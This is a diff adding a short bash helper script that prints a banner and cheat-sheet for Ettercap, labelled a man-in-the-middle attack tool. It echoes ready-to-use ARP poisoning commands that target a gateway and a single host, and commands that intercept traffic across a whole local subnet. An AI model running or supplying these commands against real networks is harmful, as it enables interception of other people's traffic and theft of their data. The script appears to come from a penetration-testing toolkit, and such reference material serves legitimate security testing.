@@ -1,0 +1,18 @@
+#!/bin/bash
+echo -e "\033[32m╔══════════════════════════════════════╗"
+echo -e "║  🕷 Ettercap — MITM Attack Tool    ║"
+echo -e "╚══════════════════════════════════════╝\033[0m"
+echo
+echo -e "\033[33mQuick ARP poison (text mode):\033[0m"
+echo "  sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//"
+echo
+echo -e "\033[33mModes:\033[0m"
+echo "  -T           Text interface"
+echo "  -M arp:remote  ARP poisoning MITM"
+echo "  -i INTERFACE   Network interface"
+echo "  -q           Quiet mode"
+echo
+echo -e "\033[33mExample - intercept traffic:\033[0m"
+echo "  sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.0/24//"
+echo
+echo -e "\033[90m──────────────────────────────────────\033[0m"
